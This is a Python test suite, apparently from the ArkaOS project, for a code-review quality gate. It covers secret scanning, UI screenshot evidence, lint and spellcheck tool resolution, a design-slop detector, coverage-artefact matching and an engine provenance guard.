    bad.write_text('token = "ghp_0123456789abcdefghijkl"\n', encoding="utf-8")
    exit_code = main([
        str(tmp_path),
        "--checks", "security-grep",
        "--changed-files", "leak.py",
        "--json",
    ])
    payload = json.loads(capsys.readouterr().out)
    assert exit_code == 1
    assert payload["overall"] == "fail"
    assert payload["results"][0]["check"] == "security-grep"


def test_cli_insufficient_evidence_exit_code(tmp_path, capsys):
    exit_code = main([str(tmp_path), "--checks", "security-grep"])
    out = capsys.readouterr().out
    assert exit_code == 2
    assert "overall: insufficient-evidence" in out


def test_cli_pass_exit_code(tmp_path, capsys):
    clean = tmp_path / "ok.py"
    clean.write_text("value = 1\n", encoding="utf-8")
    exit_code = main([
        str(tmp_path),
        "--checks", "security-grep",
        "--changed-files", "ok.py",
        "--json",
    ])
    assert exit_code == 0
    assert json.loads(capsys.readouterr().out)["overall"] == "pass"


# ─── ui-screenshot (Excellence Reform PR-D3) ────────────────────────────


def _png(path, size=20 * 1024, mtime=None):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(b"\x89PNG" + b"\x00" * size)
    if mtime is not None:
        os.utime(path, (mtime, mtime))
    return path


def test_ui_screenshot_skips_without_changed_files(tmp_path):
    result = _check_ui_screenshot(tmp_path, None, None, 30)
    assert not result.ran
    assert "no changed files" in result.summary


def test_ui_screenshot_skips_when_no_ui_files_changed(tmp_path):
    result = _check_ui_screenshot(tmp_path, ["core/state.py"], None, 30)
    assert not result.ran
    assert "no UI files changed" in result.summary


def test_ui_screenshot_fails_when_ui_changed_without_artifact(tmp_path):
    result = _check_ui_screenshot(
        tmp_path, ["app/Hero.vue", "core/state.py"], None, 30
    )
    assert result.ran and result.passed is False
    assert ".arka/evidence/ui" in result.summary
    assert "design-review" in result.summary


def test_ui_screenshot_passes_with_recent_artifact(tmp_path):
    newest = _png(tmp_path / ".arka" / "evidence" / "ui" / "d" / "hero.png")
    result = _check_ui_screenshot(tmp_path, ["app/Hero.vue"], None, 30)
    assert result.ran and result.passed is True
    assert result.details_path == str(newest)
    assert "hero.png" in result.summary


def test_ui_screenshot_rejects_stale_artifact(tmp_path):
    stale = time.time() - (UI_SCREENSHOT_WINDOW_HOURS + 2) * 3600
    _png(tmp_path / ".arka" / "evidence" / "ui" / "old.png", mtime=stale)
    result = _check_ui_screenshot(tmp_path, ["app/Hero.vue"], None, 30)
    assert result.ran and result.passed is False


def test_ui_screenshot_rejects_undersized_artifact(tmp_path):
    _png(tmp_path / ".arka" / "evidence" / "ui" / "tiny.png", size=1024)
    result = _check_ui_screenshot(tmp_path, ["app/Hero.vue"], None, 30)
    assert result.ran and result.passed is False


def test_ui_screenshot_picks_newest_artifact(tmp_path):
    older = time.time() - 3600
    _png(tmp_path / ".arka" / "evidence" / "ui" / "a.png", mtime=older)
    newest = _png(tmp_path / ".arka" / "evidence" / "ui" / "b.png")
    result = _check_ui_screenshot(tmp_path, ["style.css"], None, 30)
    assert result.passed is True
    assert result.details_path == str(newest)


def test_ui_screenshot_failure_fails_overall_report(tmp_path):
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "Hero.vue").write_text("<template/>", encoding="utf-8")
    report = run_evidence_checks(
        tmp_path, changed_files=["app/Hero.vue"],
        checks=["ui-screenshot"],
    )
    assert report.overall == "fail"


# ─── F1 polish: venv-module tool resolution (task #12, QG follow-up) ───


class TestToolCmdResolution:
    def test_path_binary_wins(self, monkeypatch):
        from core.governance import evidence_checks as ec

        monkeypatch.setattr(ec.shutil, "which", lambda t: f"/usr/bin/{t}")
        assert ec._tool_cmd("ruff") == ["ruff"]

    def test_module_fallback_when_no_binary(self, monkeypatch):
        """The false-green fix: venv-installed ruff with no PATH binary
        must still lint Python — never silently downgrade to eslint."""
        import sys as _sys

        from core.governance import evidence_checks as ec

        monkeypatch.setattr(ec.shutil, "which", lambda t: None)
        monkeypatch.setattr(
            ec.importlib.util, "find_spec", lambda t: object()
        )
        assert ec._tool_cmd("ruff") == [_sys.executable, "-m", "ruff"]

    def test_none_when_neither_exists(self, monkeypatch):
        from core.governance import evidence_checks as ec

        monkeypatch.setattr(ec.shutil, "which", lambda t: None)
        monkeypatch.setattr(ec.importlib.util, "find_spec", lambda t: None)
        assert ec._tool_cmd("ruff") is None

    def test_scoped_lint_uses_module_ruff(self, tmp_path, monkeypatch):
        import sys as _sys

        from core.governance import evidence_checks as ec

        (tmp_path / "mod.py").write_text("x = 1\n", encoding="utf-8")
        calls = []

        def fake_run(check, cmd, project_dir, timeout):
            calls.append(cmd)
            return ec.CheckResult(check=check, ran=True, passed=True,
                                  command=" ".join(cmd), exit_code=0,
                                  summary="ok")

        monkeypatch.setattr(ec.shutil, "which", lambda t: None)
        monkeypatch.setattr(ec.importlib.util, "find_spec", lambda t: object())
        monkeypatch.setattr(ec, "_run", fake_run)
        result = ec._lint_scoped(tmp_path, ["mod.py"], timeout=30)
        assert result is not None
        assert calls[0][:3] == [_sys.executable, "-m", "ruff"]


class TestLintScopeBlindSpot:
    """QG 2026-07-12: a diff carrying real .py/.js files got skipped as
    'no lintable sources' because none of the paths resolved under
    project_dir (different checkout/cwd). The skip is only honest when
    the diff has no lintable EXTENSIONS; unresolvable lintable paths
    must fall through to the project-wide lint instead."""

    def test_unresolvable_lintable_paths_fall_through_to_project_wide(
        self, tmp_path, monkeypatch,
    ):
        from core.governance import evidence_checks as ec

        (tmp_path / "real.py").write_text("x = 1\n", encoding="utf-8")
        ran = {}

        def fake_run(name, cmd, project_dir, timeout):
            ran["cmd"] = cmd
            return ec.CheckResult(
                check=name, ran=True, passed=True,
                command=" ".join(map(str, cmd)), exit_code=0, summary="ok",
            )

        monkeypatch.setattr(ec, "_run", fake_run)
        # Hermetic tooling: CI runners carry no ruff/eslint — the test
        # controls availability instead of inheriting the environment's.
        monkeypatch.setattr(ec, "_ruff_cmd", lambda: ["ruff"])
        # Changed files exist in the DIFF but not under project_dir —
        # e.g. new files reviewed from another checkout.
        result = ec._check_lint(
            tmp_path,
            ["ghost/module.py", "ghost/tool.js"],
            None,
            timeout=30,
        )
        assert result.ran, (
            "lintable extensions in the diff must never skip the gate — "
            f"got: {result.summary}"
        )
        assert "ruff" in " ".join(map(str, ran.get("cmd", []))), (
            "fallback must be the project-wide ruff run"
        )

    def test_uppercase_suffix_also_falls_through(self, tmp_path, monkeypatch):
        """QG M1: _suffixes does not case-fold but _scoped_files does —
        an unresolvable ghost/MODULE.PY must fall through like .py."""
        from core.governance import evidence_checks as ec

        (tmp_path / "real.py").write_text("x = 1\n", encoding="utf-8")

        def fake_run(name, cmd, project_dir, timeout):
            return ec.CheckResult(
                check=name, ran=True, passed=True,
                command=" ".join(map(str, cmd)), exit_code=0, summary="ok",
            )

        monkeypatch.setattr(ec, "_run", fake_run)
        monkeypatch.setattr(ec, "_ruff_cmd", lambda: ["ruff"])
        result = ec._check_lint(
            tmp_path, ["ghost/MODULE.PY"], None, timeout=30,
        )
        assert result.ran, "uppercase lintable suffix must not skip blind"

    def test_truly_unlintable_diff_still_skips_honestly(self, tmp_path):
        from core.governance import evidence_checks as ec

        result = ec._check_lint(
            tmp_path, ["README.md", "docs/x.yaml"], None, timeout=30,
        )
        assert not result.ran
        assert "no lintable sources" in result.summary


def test_spellcheck_resolves_codespell_from_interpreter_not_path(tmp_path, monkeypatch):
    """codespell installed in the venv (no PATH binary) must still run.

    QG blocker (redo 2): the check gated on `shutil.which("codespell")`
    while lint/tests resolved the venv by absolute path, so an operator
    with codespell in ~/.arkaos/venv saw `ran=false, "codespell not
    installed"` on three consecutive reviews — the copy gate was dark and
    no install could fix it. Resolution now mirrors _tool_cmd, including
    the import-name difference (the command is `codespell`, the module is
    `codespell_lib`).

    Hermetic: codespell is NOT a declared dev dependency, so the module
    lookup is stubbed rather than relying on it being importable here —
    otherwise this test silently inverts into a skip-path assertion on a
    machine without it (QG blocker, redo 3).
    """
    (tmp_path / "doc.md").write_text("hello\n", encoding="utf-8")
    calls = []

    class _Spec:  # stand-in for an importable codespell_lib
        pass

    monkeypatch.setattr(
        evidence_checks.importlib.util, "find_spec",
        lambda name: _Spec() if name == "codespell_lib" else None,
    )

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    # No PATH binary anywhere — the exact operator machine state.
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _tool: None)
    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)

    result = evidence_checks._check_spellcheck(tmp_path, ["doc.md"], None, 60)

    assert result.ran is True, "must not skip when codespell is importable"
    assert calls and calls[0][1:3] == ["-m", "codespell_lib"], (
        "must invoke the interpreter's module, not a bare `codespell`"
    )
    assert calls[0][0] == sys.executable


# ─── design-slop (design absorption W3) ─────────────────────────────────


class _SlopProc:
    def __init__(self, returncode=0, stdout="[]", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def _slop_env(monkeypatch, tmp_path, *, mode="warn", detector=True,
              node_ok=True, proc=None, raise_timeout=False):
    """Wire every external dependency of _check_design_slop to fakes."""
    monkeypatch.setattr(evidence_checks, "_design_slop_mode", lambda: mode)
    monkeypatch.setattr(
        evidence_checks, "_resolve_detector",
        lambda project_dir: ["impeccable"] if detector else None,
    )
    monkeypatch.setattr(
        evidence_checks, "_node_supports_detector", lambda: node_ok,
    )
    monkeypatch.setattr(
        evidence_checks, "_design_slop_telemetry_path",
        lambda: tmp_path / "telemetry" / "design-slop.jsonl",
    )
    if raise_timeout:
        def _run(*args, **kwargs):
            raise subprocess.TimeoutExpired(cmd="impeccable", timeout=1)
    else:
        def _run(*args, **kwargs):
            return proc or _SlopProc()
    monkeypatch.setattr(evidence_checks.subprocess, "run", _run)


def _ui_project(tmp_path):
    (tmp_path / "app.css").write_text("body { color: red; }\n", encoding="utf-8")
    return ["app.css"]


_FINDING_WARN = {"antipattern": "gradient-text", "name": "Gradient text",
                 "severity": "warning", "file": "app.css", "line": 3}
_FINDING_ADV = {"antipattern": "cream-palette", "name": "Cream palette",
                "severity": "advisory", "file": "app.css", "line": 9}


def test_design_slop_skips_when_flag_off(tmp_path, monkeypatch):
    _slop_env(monkeypatch, tmp_path, mode="off")
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert not result.ran
    assert "disabled" in result.summary


def test_design_slop_skips_without_changed_files(tmp_path, monkeypatch):
    _slop_env(monkeypatch, tmp_path)
    result = evidence_checks._check_design_slop(tmp_path, None, None, 30)
    assert not result.ran
    assert "no changed files" in result.summary


def test_design_slop_skips_when_no_ui_files(tmp_path, monkeypatch):
    _slop_env(monkeypatch, tmp_path)
    (tmp_path / "core.py").write_text("x = 1\n", encoding="utf-8")
    result = evidence_checks._check_design_slop(
        tmp_path, ["core.py"], None, 30)
    assert not result.ran
    assert "no UI files" in result.summary


def test_design_slop_skips_when_detector_missing(tmp_path, monkeypatch):
    _slop_env(monkeypatch, tmp_path, detector=False)
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert not result.ran
    assert "not installed" in result.summary


def test_design_slop_skips_on_old_node(tmp_path, monkeypatch):
    _slop_env(monkeypatch, tmp_path, node_ok=False)
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert not result.ran
    assert "22.12" in result.summary


def test_design_slop_passes_clean_run(tmp_path, monkeypatch):
    _slop_env(monkeypatch, tmp_path, proc=_SlopProc(0, "[]"))
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert result.ran and result.passed is True
    assert "0 findings" in result.summary


def test_design_slop_warn_mode_never_fails(tmp_path, monkeypatch):
    proc = _SlopProc(2, json.dumps([_FINDING_WARN, _FINDING_ADV]))
    _slop_env(monkeypatch, tmp_path, mode="warn", proc=proc)
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert result.ran and result.passed is True
    assert result.summary.startswith("ADVISORY")
    assert "gradient-text" in result.summary


def test_design_slop_hard_mode_fails_on_warning(tmp_path, monkeypatch):
    proc = _SlopProc(2, json.dumps([_FINDING_WARN]))
    _slop_env(monkeypatch, tmp_path, mode="hard", proc=proc)
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert result.ran and result.passed is False
    assert "1 warning(s)" in result.summary


def test_design_slop_hard_mode_passes_advisory_only(tmp_path, monkeypatch):
    proc = _SlopProc(2, json.dumps([_FINDING_ADV]))
    _slop_env(monkeypatch, tmp_path, mode="hard", proc=proc)
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert result.ran and result.passed is True


def test_design_slop_timeout_is_inconclusive(tmp_path, monkeypatch):
    _slop_env(monkeypatch, tmp_path, raise_timeout=True)
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert result.ran and result.passed is None
    assert result.summary == "timeout"


def test_design_slop_skips_on_malformed_json(tmp_path, monkeypatch):
    _slop_env(monkeypatch, tmp_path, proc=_SlopProc(2, "not json"))
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert not result.ran
    assert "unparseable" in result.summary


def test_design_slop_skips_on_detector_error(tmp_path, monkeypatch):
    _slop_env(monkeypatch, tmp_path, proc=_SlopProc(1, "", "boom"))
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert not result.ran
    assert "detector error" in result.summary


def test_design_slop_writes_telemetry(tmp_path, monkeypatch):
    proc = _SlopProc(2, json.dumps([_FINDING_WARN]))
    _slop_env(monkeypatch, tmp_path, mode="warn", proc=proc)
    evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    line = (tmp_path / "telemetry" / "design-slop.jsonl").read_text(encoding="utf-8")
    record = json.loads(line)
    assert record["warnings"] == 1 and record["outcome"] == "pass"


def test_design_slop_selectable_via_cli(tmp_path, monkeypatch, capsys):
    _slop_env(monkeypatch, tmp_path, proc=_SlopProc(0, "[]"))
    _ui_project(tmp_path)
    code = main([
        str(tmp_path), "--checks", "design-slop",
        "--changed-files", "app.css", "--json",
    ])
    report = json.loads(capsys.readouterr().out)
    checks = [r["check"] for r in report["results"]]
    assert checks == ["design-slop"]
    assert report["overall"] == "pass"
    assert code == 0


def test_design_slop_mode_resolution(tmp_path, monkeypatch):
    cfg = tmp_path / "config.json"
    monkeypatch.setattr(
        evidence_checks, "_design_slop_config_path", lambda: cfg)
    assert evidence_checks._design_slop_mode() == "warn"
    cfg.write_text(json.dumps({"governance": {"designSlop": "hard"}}), encoding="utf-8")
    assert evidence_checks._design_slop_mode() == "hard"
    cfg.write_text(json.dumps({"governance": {"designSlop": False}}), encoding="utf-8")
    assert evidence_checks._design_slop_mode() == "off"
    cfg.write_text("not json", encoding="utf-8")
    assert evidence_checks._design_slop_mode() == "warn"


def test_resolve_detector_order_and_no_install(tmp_path, monkeypatch):
    """which > node_modules/.bin > npx --no-install; never a bare npx."""
    calls = {"which": []}

    def fake_which(name):
        calls["which"].append(name)
        return "/usr/local/bin/impeccable" if name == "impeccable" else None

    monkeypatch.setattr(evidence_checks.shutil, "which", fake_which)
    assert evidence_checks._resolve_detector(tmp_path) == [
        "/usr/local/bin/impeccable"]

    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/npx" if name == "npx" else None,
    )
    local = tmp_path / "node_modules" / ".bin" / "impeccable"
    local.parent.mkdir(parents=True)
    local.write_text("#!/bin/sh\n", encoding="utf-8")
    assert evidence_checks._resolve_detector(tmp_path) == [str(local)]

    local.unlink()
    argv = evidence_checks._resolve_detector(tmp_path)
    assert argv == ["npx", "--no-install", "impeccable"], (
        "the gate must NEVER install: dropping --no-install turns the "
        "Quality Gate into a supply-chain entry point"
    )

    monkeypatch.setattr(evidence_checks.shutil, "which", lambda name: None)
    assert evidence_checks._resolve_detector(tmp_path) is None


def test_design_slop_paths_resolve_home_at_call_time(tmp_path, monkeypatch):
    """No import-time Path.home() baking (destructive-tests rule)."""
    monkeypatch.setenv("HOME", str(tmp_path))
    assert str(evidence_checks._design_slop_config_path()).startswith(
        str(tmp_path))
    assert str(evidence_checks._design_slop_telemetry_path()).startswith(
        str(tmp_path))


def test_design_slop_advisory_only_summary_makes_no_hard_threat(
        tmp_path, monkeypatch):
    """Advisory-only runs never claim they would fail in hard mode."""
    proc = _SlopProc(2, json.dumps([_FINDING_ADV]))
    _slop_env(monkeypatch, tmp_path, mode="warn", proc=proc)
    result = evidence_checks._check_design_slop(
        tmp_path, _ui_project(tmp_path), None, 30)
    assert result.passed is True
    assert "fails when" not in result.summary
    assert "advisory finding(s)" in result.summary


class TestZeroDiffSkips:
    """QG 2026-08-04 (PR #449): an EMPTY changed-file list bypassed the
    scoped paths via `if changed:` and fell through to the project-wide
    run, so a zero-write deliverable inherited master's 1602-error ruff
    baseline as overall=fail. Known-empty ([]) now skips; None (scope
    unknown) still runs project-wide."""

    @staticmethod
    def _fake_run(sink):
        from core.governance import evidence_checks as ec

        def fake_run(name, cmd, project_dir, timeout):
            sink.append(cmd)
            return ec.CheckResult(
                check=name, ran=True, passed=True,
                command=" ".join(map(str, cmd)), exit_code=0, summary="ok",
            )

        return fake_run

    def test_lint_empty_diff_skips_without_running(
        self, tmp_path, monkeypatch,
    ):
        from core.governance import evidence_checks as ec

        (tmp_path / "real.py").write_text("x = 1\n", encoding="utf-8")
        monkeypatch.setattr(ec, "_ruff_cmd", lambda: ["ruff"])
        ran = []
        monkeypatch.setattr(ec, "_run", self._fake_run(ran))
        result = ec._check_lint(tmp_path, [], None, timeout=30)
        assert not result.ran
        assert "empty diff" in result.summary, (
            "known-empty skip must carry the discriminating wording, "
            f"got: {result.summary}"
        )
        assert not ran, "zero-diff must never reach a lint run"

    def test_lint_none_still_runs_project_wide(self, tmp_path, monkeypatch):
        from core.governance import evidence_checks as ec

        (tmp_path / "real.py").write_text("x = 1\n", encoding="utf-8")
        monkeypatch.setattr(ec, "_ruff_cmd", lambda: ["ruff"])
        ran = []
        monkeypatch.setattr(ec, "_run", self._fake_run(ran))
        result = ec._check_lint(tmp_path, None, None, timeout=30)
        assert result.ran
        assert ran and ran[0][-1] == ".", (
            "None (scope unknown) keeps the project-wide run"
        )

    def test_typecheck_empty_diff_skips_before_config_detection(
        self, tmp_path, monkeypatch,
    ):
        from core.governance import evidence_checks as ec

        monkeypatch.setattr(ec, "_mypy_configured", lambda p: True)
        monkeypatch.setattr(ec.shutil, "which", lambda name: "/usr/bin/mypy")
        ran = []
        monkeypatch.setattr(ec, "_run", self._fake_run(ran))
        result = ec._check_typecheck(tmp_path, [], None, timeout=30)
        assert not result.ran
        assert "empty diff" in result.summary, (
            "known-empty skip must carry the discriminating wording, "
            f"got: {result.summary}"
        )
        assert not ran, "zero-diff must skip even with mypy configured"

    def test_typecheck_none_runs_when_configured(self, tmp_path, monkeypatch):
        from core.governance import evidence_checks as ec

        monkeypatch.setattr(ec, "_mypy_configured", lambda p: True)
        monkeypatch.setattr(ec.shutil, "which", lambda name: "/usr/bin/mypy")
        ran = []
        monkeypatch.setattr(ec, "_run", self._fake_run(ran))
        result = ec._check_typecheck(tmp_path, None, None, timeout=30)
        assert result.ran
        assert ran and ran[0][0] == "mypy"

    def test_csv_distinguishes_empty_from_absent(self):
        from core.governance import evidence_checks as ec

        assert ec._csv(None) is None
        assert ec._csv("") == []
        assert ec._csv("a.py, b.md") == ["a.py", "b.md"]

    def test_zero_diff_report_is_not_fail(self, tmp_path, monkeypatch):
        """End-to-end through run_evidence_checks: a zero-diff run of
        lint+typecheck yields insufficient-evidence, never a fail
        inherited from the project-wide baseline."""
        from core.governance import evidence_checks as ec

        (tmp_path / "real.py").write_text("x = 1\n", encoding="utf-8")

        def boom(name, cmd, project_dir, timeout):  # pragma: no cover
            raise AssertionError(f"no check may execute on zero diff: {cmd}")

        monkeypatch.setattr(ec, "_run", boom)
        report = ec.run_evidence_checks(
            tmp_path, changed_files=[], checks=["lint", "typecheck"],
        )
        assert report.overall == "insufficient-evidence"
        assert all(not r.ran for r in report.results), (
            "a check ran on zero diff: "
            f"{[r.check for r in report.results if r.ran]}"
        )


# ---------------------------------------------------------------------------
# Stale coverage artefacts (QG blocker B3)
#
# A coverage.xml older than the changed source measured a different codebase.
# The gate passed 86.3% on an artefact that contained none of the new modules —
# a green number vouching for code it never executed.
# ---------------------------------------------------------------------------


class TestStaleCoverage:
    def _artefact(self, project: Path, percent: str = "0.90") -> Path:
        xml = project / "coverage.xml"
        xml.write_text(
            f'<?xml version="1.0"?><coverage line-rate="{percent}"></coverage>',
            encoding="utf-8",
        )
        return xml

    def test_artefact_older_than_changed_source_fails(self, tmp_path: Path) -> None:
        from core.governance.evidence_checks import _check_coverage

        self._artefact(tmp_path)
        source = tmp_path / "mod.py"
        source.write_text("x = 1\n", encoding="utf-8")
        os.utime(tmp_path / "coverage.xml", (1_000_000, 1_000_000))

        result = _check_coverage(tmp_path, ["mod.py"], None, 60)

        assert result.passed is False
        assert "predates changed source" in result.summary

    def test_artefact_missing_a_changed_module_fails(self, tmp_path: Path) -> None:
        from core.governance.evidence_checks import _check_coverage

        source = tmp_path / "brand_new.py"
        source.write_text("x = 1\n", encoding="utf-8")
        self._artefact(tmp_path)

        result = _check_coverage(tmp_path, ["brand_new.py"], None, 60)

        assert result.passed is False
        assert "no entry for" in result.summary

    def test_fresh_artefact_covering_the_change_passes(self, tmp_path: Path) -> None:
        from core.governance.evidence_checks import _check_coverage

        source = tmp_path / "mod.py"
        source.write_text("x = 1\n", encoding="utf-8")
        xml = tmp_path / "coverage.xml"
        xml.write_text(
            '<?xml version="1.0"?><coverage line-rate="0.90">'
            '<class filename="mod.py"/></coverage>',
            encoding="utf-8",
        )

        result = _check_coverage(tmp_path, ["mod.py"], None, 60)

        assert result.passed is True

    def test_changed_tests_do_not_need_a_coverage_entry(self, tmp_path: Path) -> None:
        from core.governance.evidence_checks import _check_coverage

        (tmp_path / "tests").mkdir()
        (tmp_path / "tests" / "test_x.py").write_text("x = 1\n", encoding="utf-8")
        self._artefact(tmp_path)

        result = _check_coverage(tmp_path, ["tests/test_x.py"], None, 60)

        assert result.passed is True


class TestCoveragePathMatching:
    """Exact project-relative matching (QG round 3).

    Stem probes and suffix rules both fail-open: `core/` carries 14 colliding
    stems, this repo's own artefact yields five bare basenames, and a suffix
    rule cannot separate `core/sync/engine.py` from `vendor/core/sync/engine.py`.
    """

    def _artefact(self, project: Path, filename: str, source: str = ".") -> None:
        (project / "coverage.xml").write_text(
            '<?xml version="1.0"?><coverage line-rate="0.90">'
            f"<sources><source>{source}</source></sources>"
            f'<packages><package><classes><class filename="{filename}"/>'
            "</classes></package></packages></coverage>",
            encoding="utf-8",
        )
        os.utime(project / "coverage.xml", (time.time() + 10,) * 2)

    def _changed(self, project: Path, rel: str) -> None:
        target = project / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("x = 1\n", encoding="utf-8")

    def test_colliding_stem_is_rejected(self, tmp_path: Path) -> None:
        from core.governance.evidence_checks import _check_coverage

        self._changed(tmp_path, "core/sync/engine.py")
        self._artefact(tmp_path, "core/synapse/engine.py")

        assert _check_coverage(tmp_path, ["core/sync/engine.py"], None, 60).passed is False

    def test_deeper_path_with_same_suffix_is_rejected(self, tmp_path: Path) -> None:
        from core.governance.evidence_checks import _check_coverage

        self._changed(tmp_path, "core/sync/engine.py")
        self._artefact(tmp_path, "vendor/core/sync/engine.py")

        assert _check_coverage(tmp_path, ["core/sync/engine.py"], None, 60).passed is False

    def test_bare_basename_from_a_source_prefix_is_rejected(self, tmp_path: Path) -> None:
        """The repo's own artefact emits bare basenames under <source>.../core."""
        from core.governance.evidence_checks import _check_coverage

        self._changed(tmp_path, "dashboard/server/keys.py")
        (tmp_path / "core").mkdir(exist_ok=True)
        self._artefact(tmp_path, "keys.py", source=str(tmp_path / "core"))

        result = _check_coverage(tmp_path, ["dashboard/server/keys.py"], None, 60)

        assert result.passed is False

    def test_source_prefix_is_resolved_against_the_project(self, tmp_path: Path) -> None:
        from core.governance.evidence_checks import _check_coverage

        self._changed(tmp_path, "core/keys.py")
        self._artefact(tmp_path, "keys.py", source=str(tmp_path / "core"))

        assert _check_coverage(tmp_path, ["core/keys.py"], None, 60).passed is True

    def test_foreign_source_never_vouches(self, tmp_path: Path) -> None:
        """QG round 4: the raw relative filename was added unanchored, so an
        artefact whose <source> points at ANOTHER checkout vouched for ours."""
        from core.governance.evidence_checks import _check_coverage

        self._changed(tmp_path, "core/sync/engine.py")
        foreign = tmp_path.parent / f"{tmp_path.name}-elsewhere"
        foreign.mkdir(exist_ok=True)
        self._artefact(tmp_path, "core/sync/engine.py", source=str(foreign))

        result = _check_coverage(tmp_path, ["core/sync/engine.py"], None, 60)

        assert result.passed is False

    def test_relative_source_anchors_to_the_project(self, tmp_path: Path) -> None:
        """A relative <source> (coverage run from the project root) must
        resolve against the project, not against whatever CWD happens to be."""
        from core.governance.evidence_checks import _check_coverage

        self._changed(tmp_path, "core/sync/engine.py")
        self._artefact(tmp_path, "core/sync/engine.py", source=".")

        assert _check_coverage(tmp_path, ["core/sync/engine.py"], None, 60).passed is True

    def test_multi_source_cross_product_cannot_manufacture_paths(self, tmp_path: Path) -> None:
        """QG round 5: with sources [core, scripts], a filename measured under
        one source was also resolved under the other, vouching for a path the
        artefact never measured."""
        from core.governance.evidence_checks import _check_coverage

        self._changed(tmp_path, "core/sync/engine.py")
        (tmp_path / "scripts").mkdir(exist_ok=True)
        (tmp_path / "coverage.xml").write_text(
            '<?xml version="1.0"?><coverage line-rate="0.90">'
            f"<sources><source>{tmp_path / 'core'}</source>"
            f"<source>{tmp_path / 'scripts'}</source></sources>"
            '<packages><package><classes><class filename="sync/engine.py"/>'
            "</classes></package></packages></coverage>",
            encoding="utf-8",
        )
        os.utime(tmp_path / "coverage.xml", (time.time() + 10,) * 2)

        # the file measured under core/ is genuinely covered...
        assert _check_coverage(tmp_path, ["core/sync/engine.py"], None, 60).passed is True
        # ...but scripts/sync/engine.py was never measured and must not pass
        self._changed(tmp_path, "scripts/sync/engine.py")
        os.utime(tmp_path / "coverage.xml", (time.time() + 20,) * 2)
        result = _check_coverage(
            tmp_path, ["core/sync/engine.py", "scripts/sync/engine.py"], None, 60
        )

        assert result.passed is False

    def test_ambiguous_multi_source_resolution_fails_closed(self, tmp_path: Path) -> None:
        """When one filename resolves to an existing file under TWO sources,
        the artefact cannot say which was measured — vouch for neither."""
        from core.governance.evidence_checks import _check_coverage

        self._changed(tmp_path, "core/util.py")
        self._changed(tmp_path, "scripts/util.py")
        (tmp_path / "coverage.xml").write_text(
            '<?xml version="1.0"?><coverage line-rate="0.90">'
            f"<sources><source>{tmp_path / 'core'}</source>"
            f"<source>{tmp_path / 'scripts'}</source></sources>"
            '<packages><package><classes><class filename="util.py"/>'
            "</classes></package></packages></coverage>",
            encoding="utf-8",
        )
        os.utime(tmp_path / "coverage.xml", (time.time() + 10,) * 2)

        assert _check_coverage(tmp_path, ["core/util.py"], None, 60).passed is False

    def test_doc_only_edits_do_not_stale_the_artefact(self, tmp_path: Path) -> None:
        """QG round 5: CHANGELOG.md counted as 'changed source', forcing a
        coverage regeneration for edits no test could ever execute."""
        from core.governance.evidence_checks import _check_coverage

        self._changed(tmp_path, "core/sync/engine.py")
        self._artefact(tmp_path, "core/sync/engine.py")
        changelog = tmp_path / "CHANGELOG.md"
        changelog.write_text("# notes\n", encoding="utf-8")
        os.utime(changelog, (time.time() + 100,) * 2)  # newer than the artefact

        result = _check_coverage(
            tmp_path, ["core/sync/engine.py", "CHANGELOG.md"], None, 60
        )

        assert result.passed is True


# ─── provenance guard (issue #453) ──────────────────────────────────────


@contextlib.contextmanager
def _patched_engine(core_init: Path):
    """Pretend `import core` resolved to `core_init` for the duration.

    The real failure swaps the whole package via a `.pth`; swapping
    `core.__file__` reproduces exactly what the guard reads, without
    mutating sys.path inside the test process.
    """
    import core as _core

    original = _core.__file__
    _core.__file__ = str(core_init)
    try:
        yield
    finally:
        _core.__file__ = original


class TestProvenanceGuard:
    """The gate must never validate one checkout with another's engine.

    Reproduced on the operator's machine: the ArkaOS venv carries an
    editable ``.pth`` pointing at the npx install cache, so a bare
    ``python -m core.governance.evidence_checks`` launched from a cwd
    outside the repo imports the PUBLISHED copy (v5.11.0) and reports on
    the working tree (v5.13.0) — a report that looks exactly like a
    trustworthy one.
    """

    @staticmethod
    def _engine_checkout(root: Path) -> None:
        """Minimal marker that makes `root` look like an ArkaOS checkout."""
        (root / "core" / "governance").mkdir(parents=True, exist_ok=True)
        (root / "core" / "governance" / "evidence_checks.py").write_text(
            "# marker\n", encoding="utf-8"
        )

    def test_foreign_project_is_never_blocked(self, tmp_path):
        """Gating a CLIENT project legitimately runs the engine from elsewhere."""
        report = run_evidence_checks(
            tmp_path, changed_files=[], checks=["lint"],
        )
        assert report.overall == "insufficient-evidence"

    def test_engine_checkout_gated_by_a_foreign_engine_raises(self, tmp_path):
        """The reproduced case: cwd outside the repo, engine from the npx cache."""
        self._engine_checkout(tmp_path)
        fake_engine = tmp_path.parent / f"{tmp_path.name}-npx-cache" / "core"
        fake_engine.mkdir(parents=True, exist_ok=True)
        (fake_engine / "__init__.py").write_text("", encoding="utf-8")

        with (
            pytest.raises(evidence_checks.ProvenanceError) as excinfo,
            _patched_engine(fake_engine / "__init__.py"),
        ):
            run_evidence_checks(tmp_path, changed_files=[], checks=["lint"])

        message = str(excinfo.value)
        assert "provenance mismatch" in message
        assert str(fake_engine) in message, "the wrong engine must be named"
        assert str(tmp_path.resolve()) in message

